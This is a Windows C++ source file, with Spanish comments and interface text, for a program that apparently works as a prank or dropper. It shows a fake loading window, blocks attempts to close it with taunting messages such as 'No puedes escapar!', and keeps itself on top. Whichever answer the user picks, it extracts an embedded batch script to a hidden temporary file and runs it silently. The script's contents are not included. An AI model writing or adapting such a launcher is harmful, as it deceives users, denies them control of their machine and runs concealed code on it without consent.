#include <windows.h>
#include <commctrl.h>
#include <string>
#include <thread>
#include <chrono>
#include "resource.h" // <-- AÑADIR ESTA LÍNEA

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

// Variables globales
HWND hMainWnd = NULL;
HWND hProgressBar = NULL;
HWND hSecondWnd = NULL;
HWND hQuestionWnd = NULL;
bool windowClosed = false;
bool isSecondWindow = false;
HFONT hFont = NULL;

// Función para crear fuente personalizada
void CreateCustomFont() {
    hFont = CreateFont(
        16, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
        DEFAULT_CHARSET, OUT_OUTLINE_PRECIS, CLIP_DEFAULT_PRECIS,
        CLEARTYPE_QUALITY, VARIABLE_PITCH, TEXT("Arial")
    );
}

// Función para crear la barra de progreso con estilo
void CreateProgressBar(HWND hWnd) {
    hProgressBar = CreateWindowEx(
        0,
        PROGRESS_CLASS,
        NULL,
        WS_VISIBLE | WS_CHILD | PBS_SMOOTH,
        50, 80, 350, 25,
        hWnd,
        NULL,
        GetModuleHandle(NULL),
        NULL
    );
    
    SendMessage(hProgressBar, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
    SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
}

// Función para actualizar la barra de progreso
void UpdateProgressBar(HWND parentWnd) {
    for (int i = 0; i <= 100; i++) {
        SendMessage(hProgressBar, PBM_SETPOS, i, 0);
        std::this_thread::sleep_for(std::chrono::milliseconds(70));
    }
    
    // Enviar mensaje personalizado cuando termine
    PostMessage(parentWnd, WM_USER + 1, 0, 0);
}

// Función para ejecutar archivo .bat
void ExecuteBatFile()
{
    // 1. Encontrar el recurso del script en el ejecutable.
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SCRIPT), RT_RCDATA);
    if (hRes == NULL) {
        MessageBox(NULL, "No se pudo encontrar el recurso del script.", "Error Fatal", MB_OK | MB_ICONERROR);
        return;
    }

    // 2. Cargar el recurso en memoria.
    HGLOBAL hResLoad = LoadResource(NULL, hRes);
    if (hResLoad == NULL) {
        MessageBox(NULL, "No se pudo cargar el recurso del script.", "Error Fatal", MB_OK | MB_ICONERROR);
        return;
    }

    // 3. Obtener un puntero a los datos del script.
    LPVOID pResData = LockResource(hResLoad);
    DWORD dwSize = SizeofResource(NULL, hRes);
    if (pResData == NULL) {
        MessageBox(NULL, "No se pudo acceder a los datos del script.", "Error Fatal", MB_OK | MB_ICONERROR);
        return;
    }

    // 4. Crear un archivo temporal para guardar el script.
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath); // Obtener la ruta de la carpeta temporal
    char batPath[MAX_PATH];
    sprintf_s(batPath, "%s\\~temp_script_%d.bat", tempPath, GetCurrentProcessId()); // Crear un nombre de archivo único

    HANDLE hFile = CreateFileA(batPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        MessageBox(NULL, "No se pudo crear el archivo temporal.", "Error Fatal", MB_OK | MB_ICONERROR);
        return;
    }

    // 5. Escribir los datos del recurso en el archivo temporal y ejecutarlo.
    DWORD dwBytesWritten;
    WriteFile(hFile, pResData, dwSize, &dwBytesWritten, NULL);
    CloseHandle(hFile);
    ShellExecuteA(NULL, "open", batPath, NULL, NULL, SW_HIDE);
}

// Función para mostrar ventana con efecto
void ShowWindowWithEffect(HWND hWnd) {
    ShowWindow(hWnd, SW_SHOW);
    AnimateWindow(hWnd, 300, AW_CENTER);
    SetForegroundWindow(hWnd);
    BringWindowToTop(hWnd);
}

// Procedimiento de ventana para la pregunta
LRESULT CALLBACK QuestionWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_CREATE: {
            // Configurar fondo oscuro
            SetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(40, 40, 40)));
            
            // Crear texto de pregunta
            HWND hText = CreateWindow(
                "STATIC",
                "¿Conoces Forge verdad?",
                WS_VISIBLE | WS_CHILD | SS_CENTER,
                20, 30, 360, 40,
                hWnd,
                NULL,
                GetModuleHandle(NULL),
                NULL
            );
            SendMessage(hText, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // Botón "Sí" con estilo
            HWND hBtnSi = CreateWindow(
                "BUTTON",
                "Si",
                WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON | BS_FLAT,
                120, 90, 80, 35,
                hWnd,
                (HMENU)1,
                GetModuleHandle(NULL),
                NULL
            );
            SendMessage(hBtnSi, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            // Botón "No" con estilo
            HWND hBtnNo = CreateWindow(
                "BUTTON",
                "No",
                WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON | BS_FLAT,
                220, 90, 80, 35,
                hWnd,
                (HMENU)2,
                GetModuleHandle(NULL),
                NULL
            );
            SendMessage(hBtnNo, WM_SETFONT, (WPARAM)hFont, TRUE);
            break;
        }
        
        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(255, 255, 255));
            SetBkColor(hdcStatic, RGB(40, 40, 40));
            return (LRESULT)CreateSolidBrush(RGB(40, 40, 40));
        }
        
        case WM_COMMAND: {
            if (LOWORD(wParam) == 1) { // Botón "Sí"
                MessageBox(hWnd, "A bueno me vale madres igual asi te jodiste", "😈 Respuesta", MB_OK | MB_ICONINFORMATION);
                ExecuteBatFile();
                PostQuitMessage(0);
            } else if (LOWORD(wParam) == 2) { // Botón "No"
                MessageBox(hWnd, "Yo te enseñare que es Forge entonces!", "🔥 Respuesta", MB_OK | MB_ICONINFORMATION);
                ExecuteBatFile();
                PostQuitMessage(0);
            }
            break;
        }
        
        case WM_CLOSE:
            // No permitir cerrar la ventana
            MessageBox(hWnd, "No puedes escapar! 😈", "Bloqueado", MB_OK | MB_ICONWARNING);
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Procedimiento de ventana para la segunda ventana
LRESULT CALLBACK SecondWndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_CREATE: {
            // Configurar fondo oscuro
            SetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(60, 20, 20)));
            
            // Crear texto amenazante
            HWND hText = CreateWindow(
                "STATIC",
                "Creiste que te escaparias de mi tan facilmente?",
                WS_VISIBLE | WS_CHILD | SS_CENTER,
                10, 20, 380, 40,
                hWnd,
                NULL,
                GetModuleHandle(NULL),
                NULL
            );
            SendMessage(hText, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            CreateProgressBar(hWnd);
            
            // Iniciar progreso en un hilo separado
            std::thread progressThread([hWnd]() {
                UpdateProgressBar(hWnd);
            });
            progressThread.detach();
            break;
        }
        
        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(255, 100, 100));
            SetBkColor(hdcStatic, RGB(60, 20, 20));
            return (LRESULT)CreateSolidBrush(RGB(60, 20, 20));
        }
        
        case WM_USER + 1: {
            // Mensaje personalizado cuando termine la barra de progreso
            ShowWindow(hWnd, SW_HIDE);
            
            // Crear ventana de pregunta
            WNDCLASS wc = {};
            wc.lpfnWndProc = QuestionWndProc;
            wc.hInstance = GetModuleHandle(NULL);
            wc.lpszClassName = "QuestionWindow";
            wc.hbrBackground = CreateSolidBrush(RGB(40, 40, 40));
            wc.hCursor = LoadCursor(NULL, IDC_ARROW);
            wc.hIcon = LoadIcon(NULL, IDI_WARNING);
            
            if (!GetClassInfo(GetModuleHandle(NULL), "QuestionWindow", &wc)) {
                RegisterClass(&wc);
            }
            
            hQuestionWnd = CreateWindow(
                "QuestionWindow",
                "🔥 Pregunta Importante",
                WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                CW_USEDEFAULT, CW_USEDEFAULT, 420, 180,
                NULL, NULL, GetModuleHandle(NULL), NULL
            );
            
            ShowWindowWithEffect(hQuestionWnd);
            break;
        }
        
        case WM_CLOSE:
            // No permitir cerrar la ventana definitivamente
            MessageBox(hWnd, "JAJAJA no puedes cerrar esto! 😈", "Bloqueado", MB_OK | MB_ICONWARNING);
            return 0;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Procedimiento de ventana principal
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
        case WM_CREATE: {
            // Configurar fondo con gradiente
            SetClassLongPtr(hWnd, GCLP_HBRBACKGROUND, (LONG_PTR)CreateSolidBrush(RGB(20, 40, 60)));
            
            // Crear texto de bienvenida
            HWND hText = CreateWindow(
                "STATIC",
                "Bienvenido, espera, esta cargando!",
                WS_VISIBLE | WS_CHILD | SS_CENTER,
                50, 30, 350, 30,
                hWnd,
                NULL,
                GetModuleHandle(NULL),
                NULL
            );
            SendMessage(hText, WM_SETFONT, (WPARAM)hFont, TRUE);
            
            CreateProgressBar(hWnd);
            
            // Iniciar progreso en un hilo separado
            std::thread progressThread([hWnd]() {
                UpdateProgressBar(hWnd);
            });
            progressThread.detach();
            break;
        }
        
        case WM_CTLCOLORSTATIC: {
            HDC hdcStatic = (HDC)wParam;
            SetTextColor(hdcStatic, RGB(255, 255, 255));
            SetBkColor(hdcStatic, RGB(20, 40, 60));
            return (LRESULT)CreateSolidBrush(RGB(20, 40, 60));
        }
        
        case WM_USER + 1: {
            // Mensaje personalizado cuando termine la barra de progreso
            ShowWindow(hWnd, SW_HIDE);
            
            if (windowClosed) {
                // Ya se creó la segunda ventana, no hacer nada
                return 0;
            }
            
            // Crear ventana de pregunta directamente
            WNDCLASS wc = {};
            wc.lpfnWndProc = QuestionWndProc;
            wc.hInstance = GetModuleHandle(NULL);
            wc.lpszClassName = "QuestionWindow";
            wc.hbrBackground = CreateSolidBrush(RGB(40, 40, 40));
            wc.hCursor = LoadCursor(NULL, IDC_ARROW);
            wc.hIcon = LoadIcon(NULL, IDI_QUESTION);
            
            if (!GetClassInfo(GetModuleHandle(NULL), "QuestionWindow", &wc)) {
                RegisterClass(&wc);
            }
            
            hQuestionWnd = CreateWindow(
                "QuestionWindow",
                "🤔 Pregunta Importante",
                WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                CW_USEDEFAULT, CW_USEDEFAULT, 420, 180,
                NULL, NULL, GetModuleHandle(NULL), NULL
            );
            
            ShowWindowWithEffect(hQuestionWnd);
            break;
        }
        
        case WM_CLOSE: {
            windowClosed = true;
            
            // Crear segunda ventana inmediatamente
            WNDCLASS wc = {};
            wc.lpfnWndProc = SecondWndProc;
            wc.hInstance = GetModuleHandle(NULL);
            wc.lpszClassName = "SecondWindow";
            wc.hbrBackground = CreateSolidBrush(RGB(60, 20, 20));
            wc.hCursor = LoadCursor(NULL, IDC_ARROW);
            wc.hIcon = LoadIcon(NULL, IDI_WARNING);
            
            if (!GetClassInfo(GetModuleHandle(NULL), "SecondWindow", &wc)) {
                RegisterClass(&wc);
            }
            
            hSecondWnd = CreateWindow(
                "SecondWindow",
                "😈 No puedes escapar!",
                WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
                CW_USEDEFAULT, CW_USEDEFAULT, 420, 160,
                NULL, NULL, GetModuleHandle(NULL), NULL
            );
            
            ShowWindowWithEffect(hSecondWnd);
            
            // Ocultar ventana principal
            ShowWindow(hWnd, SW_HIDE);
            return 0;
        }
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Punto de entrada principal SIN CONSOLA
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Crear fuente personalizada
    CreateCustomFont();
    
    // Inicializar controles comunes
    INITCOMMONCONTROLSEX icex;
    icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
    icex.dwICC = ICC_PROGRESS_CLASS;
    InitCommonControlsEx(&icex);
    
    // Registrar clase de ventana principal
    WNDCLASS wc = {};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "MainWindow";
    wc.hbrBackground = CreateSolidBrush(RGB(20, 40, 60));
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    RegisterClass(&wc);
    
    // Crear ventana principal centrada
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowWidth = 450;
    int windowHeight = 160;
    
    hMainWnd = CreateWindow(
        "MainWindow",
        "🔥 Iniciando...",
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU,
        (screenWidth - windowWidth) / 2,
        (screenHeight - windowHeight) / 2,
        windowWidth, windowHeight,
        NULL, NULL, hInstance, NULL
    );
    
    ShowWindowWithEffect(hMainWnd);
    UpdateWindow(hMainWnd);
    
    // Hacer que la ventana esté siempre en primer plano
    SetWindowPos(hMainWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
    
    // Bucle de mensajes
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Limpiar recursos
    if (hFont) DeleteObject(hFont);
    
    return (int)msg.wParam;
}